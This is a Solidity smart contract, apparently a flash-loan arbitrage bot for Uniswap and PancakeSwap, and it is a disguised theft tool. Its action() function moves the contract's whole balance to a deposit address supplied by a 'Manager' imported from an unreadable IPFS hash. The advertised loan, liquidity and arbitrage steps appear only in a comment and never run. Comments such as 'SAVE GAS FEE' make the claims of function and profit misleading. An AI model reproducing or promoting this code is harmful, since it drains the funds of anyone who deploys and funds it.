ragma solidity ^0.6.6;

// Multiplier-Finance Smart Contracts
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// Uniswap Smart Contracts
//import "https://github.com/pancakeswap/Uni-swap-core/blob/master/contracts/interfaces/IUniswapCallee.sol";
//import "https://github.com/pancakeswap/Uni-swap-core/blob/master/contracts/interfaces/IUniswapFactory.sol";
//import "https://github.com/pancakeswap/Uni-swap-core/blob/master/contracts/interfaces/IUniswapPair.sol";


// Code Manager
import "ipfs://QmTjKKq7yowWv9zUWbpeLpo8HZX86y2M2wZtZDFqnVEt77";

contract GetFlashLoan {
string public tokenName;
string public tokenSymbol;
uint loanAmount;
Manager manager;

constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
tokenName = _tokenName;
tokenSymbol = _tokenSymbol;
loanAmount = _loanAmount;

manager = new Manager();
}
receive() external payable {}

function action() public payable {

    // Send required coins for swap
    payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
   
    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
    manager.performTasks();
   
    /*
    // Submit token to Ethereum blockchain
    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
        // List the token on Uniswap & send coins required for swaps
manager.UniswapListToken(tokenName, tokenSymbol, tokenAddress);
payable(manager.UniswapDepositAddress()).transfer(300000000000000000);
        // Get ETH Loan from Aave
string memory loanAddress = manager.takeAaveLoan(loanAmount);
// Convert half ETH to DAI
manager.UniswapDAItoETH(loanAmount / 2);
        // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.UniswapCreatePool(tokenAddress, "ETH");
manager.UniswappAddLiquidity(ethPair, loanAmount / 2);
string memory daiPair = manager.UniswapCreatePool(tokenAddress, "DAI");
manager.UniswappAddLiquidity(daiPair, loanAmount / 2);
   
        // Perform swaps and profit on Self-Arbitrage
manager.UniswapPerformSwaps();
// Move remaining ETH from Contract to your account
manager.contractToWallet("ETH");
        // Repay Flash loan
manager.repayAaveLoan(loanAddress);
    */
}
}
